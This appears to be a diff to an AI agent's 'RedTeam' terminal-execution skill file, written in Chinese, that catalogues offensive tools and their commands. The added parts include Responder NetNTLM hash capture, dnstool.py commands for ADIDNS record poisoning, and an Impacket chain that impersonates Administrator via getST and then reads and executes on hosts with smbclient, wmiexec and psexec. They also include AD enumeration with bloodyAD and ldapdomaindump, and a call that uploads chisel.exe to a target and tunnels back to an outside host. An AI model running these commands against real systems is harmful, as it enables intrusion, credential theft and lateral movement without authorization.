@@ -20,7 +20,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具一：gogo (极速资产与协议指纹探针)
 
-**二进制路径**: d:\mcp\redteam-tools\gogo.exe
+**二进制路径**: d:\mcp\tools\gogo.exe
 
 **核心参数**（来自 gogo -h）：
 
@@ -46,7 +46,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具二：fscan (内网综合大杀器)
 
-**二进制路径**: d:\mcp\redteam-tools\fscan.exe
+**二进制路径**: d:\mcp\tools\fscan.exe
 
 **核心参数**（来自 fscan -h）：
 
@@ -80,7 +80,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具三：httpx (高并发 HTTP 探针与指纹识别)
 
-**二进制路径**: d:\mcp\redteam-tools\httpx.exe
+**二进制路径**: d:\mcp\tools\httpx.exe
 
 **核心参数**（来自 httpx -h）：
 
@@ -113,7 +113,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具四：nuclei (基于 YAML 模板的精确漏洞扫描器)
 
-**二进制路径**: d:\mcp\redteam-tools\nuclei.exe
+**二进制路径**: d:\mcp\tools\nuclei.exe
 
 **核心参数**（来自 nuclei -h）：
 
@@ -153,7 +153,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具五：ffuf (超音速 HTTP Fuzzer)
 
-**二进制路径**: d:\mcp\redteam-tools\ffuf.exe
+**二进制路径**: d:\mcp\tools\ffuf.exe
 
 **核心参数**（来自 ffuf -h）：
 
@@ -173,10 +173,10 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 **实战指令**:
 
   # 基础目录爆破
-  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\redteam-tools\dict.txt -mc 200,301,302 -s
+  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\tools\dict.txt -mc 200,301,302 -s
 
   # 带扩展名查备份文件
-  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\redteam-tools\dict.txt -e .php,.bak,.zip,.sql -mc 200 -s
+  ffuf -u http://10.10.26.107:8080/FUZZ -w d:\mcp\tools\dict.txt -e .php,.bak,.zip,.sql -mc 200 -s
 
   # 过滤固定长度干扰
   ffuf -u http://target.com/FUZZ -w dict.txt -mc 200,301 -fs 1234 -s
@@ -188,7 +188,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具六：dnsx (DNS 解析与子域名枚举)
 
-**二进制路径**: d:\mcp\redteam-tools\dnsx.exe
+**二进制路径**: d:\mcp\tools\dnsx.exe
 
 **实战指令**:
 
@@ -202,7 +202,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具七：kerbrute (Kerberos 用户枚举与密码喷洒)
 
-**二进制路径**: d:\mcp\redteam-tools\kerbrute.exe
+**二进制路径**: d:\mcp\tools\kerbrute.exe
 
 **子命令**：
 
@@ -350,7 +350,7 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
 
 ##  工具八：SharpHound (AD 权限图谱收集 - Windows)
 
-**二进制路径**: d:\mcp\redteam-tools\SharpHound.exe
+**二进制路径**: d:\mcp\tools\SharpHound.exe
 
 > SharpHound 是 BloodHound 的官方 Windows 收集器，性能更优，支持更多 Windows 特有数据收集。
 > 适用于已获得 Windows 主机权限的场景，可直接在域内机器上运行。
@@ -550,7 +550,103 @@ description: RedTeam physical terminal execution skill. ONLY run using run_in_te
   # 查看捕获的哈希
   # Hashes 保存在: /usr/share/responder/logs/
 
+**稳定复现建议（含 downdetector.ps1 场景）**：
+
+- 若目标链路是触发认证并抓取 NetNTLM，优先使用 **Responder 监听**，比 relay 链更直接。
+- 监听类任务务必后台运行，并周期性读取输出，避免阻塞会话。
+- 先确认网卡与广播域，再启用 `-I` 指定接口，减少空跑。
+
+---
+
+## 工具补充：dnstool.py（ADIDNS 记录管理）
+
+> 用于快速创建/修改 ADIDNS 记录，替代手工 LDAP 写入。
+> 适合 DNS 记录投毒、委派链路准备和复现场景自动化。
+
+**入口方式**：
+
+- `dnstool.py`（常见于 krbrelayx / impacket 生态）
+- 或 `python -m dnstool`（按实际安装方式）
+
+**常用操作示例**：
+
+```bash
+# 添加 A 记录
+dnstool.py -u 'corp.local\\user' -p 'Password123!' -r app01.corp.local -d 10.10.10.66 --action add 192.168.1.10
+
+# 修改记录
+dnstool.py -u 'corp.local\\user' -p 'Password123!' -r app01.corp.local -d 10.10.10.77 --action modify 192.168.1.10
+
+# 删除记录
+dnstool.py -u 'corp.local\\user' -p 'Password123!' -r app01.corp.local --action remove 192.168.1.10
+```
+
+**注意事项**：
+
+- 操作前先确认 DNS 分区与 ACL，避免写入失败误判。
+- 成功写入后用 `nslookup`/`Resolve-DnsName` 二次验证解析生效。
+
 ### Impacket  Kerberoasting / AS-REP Roasting
+
+### Impacket 核心脚本链路（取票据 + 读目标）
+
+> 下列脚本是最终拿票据、横向执行与读取目标内容的核心组合：
+
+- `getST.py`
+- `smbclient.py`
+- `wmiexec.py`
+- `psexec.py`
+
+**最小链路示例**：
+
+```bash
+# 1) getST: 申请/伪造服务票据
+impacket-getST -spn cifs/target.corp.local -impersonate Administrator -dc-ip 192.168.1.10 corp.local/machine_account:password
+
+# 2) smbclient: 用票据或凭据访问共享并读取文件
+impacket-smbclient corp.local/Administrator:password@target.corp.local -share C$ 'get Users\\Public\\flag.txt'
+
+# 3) wmiexec: 无文件执行命令回显
+impacket-wmiexec corp.local/Administrator:password@target.corp.local 'type C:\\Users\\Public\\flag.txt'
+
+# 4) psexec: 服务方式执行（需要更高噪声容忍）
+impacket-psexec corp.local/Administrator:password@target.corp.local cmd.exe
+```
+
+---
+
+## LDAP/DNS 诊断工具组（bloodyAD / ldapsearch / ldapdomaindump）
+
+> 用于快速确认 gMSA、委派配置、DNS 区域 ACL 是否满足攻击前提。
+
+### bloodyAD
+
+**安装**：`pip install bloodyAD`
+
+**示例**：
+
+```bash
+# 枚举目标对象属性（含委派相关字段）
+bloodyAD --host 192.168.1.10 -d corp.local -u user -p 'Password123!' get object 'CN=APP01,OU=Servers,DC=corp,DC=local'
+
+# 查询用户对象（用于验证 gMSA/委派变更）
+bloodyAD --host 192.168.1.10 -d corp.local -u user -p 'Password123!' get object 'CN=gmsa_svc,CN=Managed Service Accounts,DC=corp,DC=local'
+```
+
+### ldapsearch / ldapdomaindump
+
+- `ldapsearch`：快速点查关键属性（委派、SPN、ACL 相关字段）。
+- `ldapdomaindump`：全量导出做离线核验与报告。
+
+**示例**：
+
+```bash
+# impacket-ldapsearch 快速核验委派字段
+impacket-ldapsearch corp.local/user:pass -dc-hosts=192.168.1.10 -query "(servicePrincipalName=*)"
+
+# ldapdomaindump 导出域数据进行 ACL/DNS 关联分析
+ldapdomaindump ldap://192.168.1.10 -u 'corp\\user' -p 'password' -o ./ldapdump
+```
 
   # AS-REP Roasting — Windows 入口点
   impacket-GetNPUsers corp.local/user:pass -dc-ip 192.168.1.10 -request -format hashcat -outputfile asrep_hashes.txt
@@ -1206,7 +1302,7 @@ proxychains4 nxc smb 10.10.10.50 -u Administrator -p 'Pass123!'
     target="192.168.1.100",
     username="Administrator",
     password="Pass123!",
-    local_file="d:\\mcp\\redteam-tools\\chisel.exe",
+    local_file="d:\\mcp\\tools\\chisel.exe",
     remote_path="C:\\Windows\\Temp\\chisel.exe",
     exec_command="C:\\Windows\\Temp\\chisel.exe client 1.2.3.4:8080 R:8080"
   )
